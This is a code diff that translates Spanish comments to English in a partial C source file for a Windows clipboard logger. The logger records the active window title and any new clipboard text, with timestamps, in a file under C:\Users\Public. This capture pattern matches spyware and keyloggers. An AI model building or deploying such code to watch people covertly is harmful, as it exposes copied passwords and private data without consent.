@@ -2,7 +2,7 @@
 
 t_ClipboardState g_clipboardState = {0};
 
-// Abre/crea C:\Users\Public\clipboard.log
+// Opens/creates C:\Users\Public\clipboard.log
 
 BOOL OpenClipboardLog(void)
 {
@@ -10,14 +10,14 @@ BOOL OpenClipboardLog(void)
     time_t      currentTime;
     struct tm   timeInfo;
 
-    // Crear la ruta completa del archivo de log clipboard
+    // Build full path for clipboard log file
     snprintf(logPath, sizeof(logPath), "C:\\Users\\Public\\clipboard.log");
 
-    // Abrir el archivo de log de forma segura
+    // Open the log file safely
     if (fopen_s(&g_clipboardState.clipboardFile, logPath, "ab+") != 0 || !g_clipboardState.clipboardFile)
         return FALSE;
 
-    // Escribir BOM si está vacío
+    // Write BOM if file is empty
     if (fseek(g_clipboardState.clipboardFile, 0, SEEK_END) == 0) {
         long size = ftell(g_clipboardState.clipboardFile);
         if (size == 0) {
@@ -26,7 +26,7 @@ BOOL OpenClipboardLog(void)
         }
     }
 
-    // Obtener tiempo actual y escribir cabecera de inicio
+    // Get current time and write start header
     time(&currentTime);
     localtime_s(&timeInfo, &currentTime);
 
@@ -35,11 +35,11 @@ BOOL OpenClipboardLog(void)
             timeInfo.tm_mday, timeInfo.tm_mon + 1, timeInfo.tm_year + 1900,
             timeInfo.tm_hour, timeInfo.tm_min, timeInfo.tm_sec);
     fflush(g_clipboardState.clipboardFile);
-    (void)logPath; // Evita warning si no se usa
+    (void)logPath; // Avoid unused warning
     return TRUE;
 }
 
-// Cierra el archivo log del clipboard
+// Closes the clipboard log file
 void CloseClipboardLog(void)
 {
     if (g_clipboardState.clipboardFile) {
@@ -50,7 +50,7 @@ void CloseClipboardLog(void)
     }
 }
 
-// Obtiene el titulo de la ventana activa
+// Retrieves the active window title
 static BOOL getActiveWindowTitle(char *buffer, size_t bufSize)
 {
     HWND    activeWindow;
@@ -73,7 +73,7 @@ static BOOL getActiveWindowTitle(char *buffer, size_t bufSize)
     return TRUE;
 }
 
-// Escribe timestamp + ventana activa + texto nuevo
+// Writes timestamp + active window + new text
 static void writeClipboardEntry(const char *text, const char *windowTitle)
 {
     time_t      currentTime;
@@ -88,8 +88,8 @@ static void writeClipboardEntry(const char *text, const char *windowTitle)
     fflush(g_clipboardState.clipboardFile);
 }
 
-// Obtiene texto (UTF-16 -> UTF-8 simple) del portapapeles
-// Devuelve TRUE si no hay texto valido
+// Gets text (UTF-16 -> simple UTF-8) from clipboard
+// Returns TRUE if valid text was obtained
 static BOOL getClipboardText(char *buffer, size_t bufSize)
 {
     HGLOBAL         hData;
@@ -118,7 +118,7 @@ static BOOL getClipboardText(char *buffer, size_t bufSize)
     return (len > 1);
 }
 
-// Comprueba si el texto cambió y lo registra
+// Checks if clipboard text changed and logs it
 void LogClipboardIfChanged(void)
 {
     char    current[512];
